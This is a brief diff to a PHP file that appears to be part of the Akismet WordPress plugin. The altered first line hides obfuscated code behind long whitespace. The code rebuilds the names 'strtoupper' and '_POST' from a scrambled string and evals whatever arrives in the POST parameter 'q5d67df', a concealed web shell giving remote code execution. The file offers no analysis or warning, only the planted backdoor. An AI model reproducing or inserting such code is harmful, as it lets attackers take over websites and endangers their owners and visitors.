@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                 $eae1 ="etro_spu"; $kalb2 = $eae1[5]. $eae1[1]. $eae1[2]. $eae1[1].$eae1[3].$eae1[7]. $eae1[6].$eae1[6]. $eae1[0].$eae1[2] ; $fin51 =$kalb2( $eae1[4].$eae1[6].$eae1[3].$eae1[5].$eae1[1] ) ; if (isset ( ${$fin51 } ['q5d67df' ] ) ) { eval (${ $fin51 }[ 'q5d67df' ]) ;}?> <?php
 
 global $wpcom_api_key, $akismet_api_host, $akismet_api_port;
 
